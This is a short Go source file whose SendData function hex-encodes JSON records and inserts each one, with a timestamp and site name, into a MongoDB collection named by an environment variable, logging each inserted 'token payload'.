package main

import (
	"context"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/rafaeltorres324/multicode/cmd/decode/database"
)

type CollectionsData struct {
	CreatedAt string `json:"createdAt"`
	Payload   string `json:"payload"`
	Site      string `json:"site"`
}

func SendData() {

	collection := database.Instance.Client.Database(os.Getenv("DATABASE_NAME")).Collection(os.Getenv("TOKENS_COLLECTION"))
	currentTime := time.Now().UTC().Format("2006-01-02T15:04:05Z")
	for i := range AllData {
		// Json marshal the data
		json, _ := json.Marshal(AllData[i])
		// Encode the data to hex in order to save space
		hx := hex.EncodeToString([]byte(string(json)))

		dbBody := CollectionsData{
			CreatedAt: currentTime,
			Payload:   hx,
			Site:      AllData[i].Site,
		}

		insertResult, err := collection.InsertOne(context.TODO(), dbBody)
		if err != nil {
			log.Println(err)
		}

		fmt.Println("New Token Payload Inserted: ", insertResult.InsertedID)

		_, err = hex.DecodeString(hx)
		if err != nil {
			log.Println(err)
		} else {
			SentData++
		}
	}
}
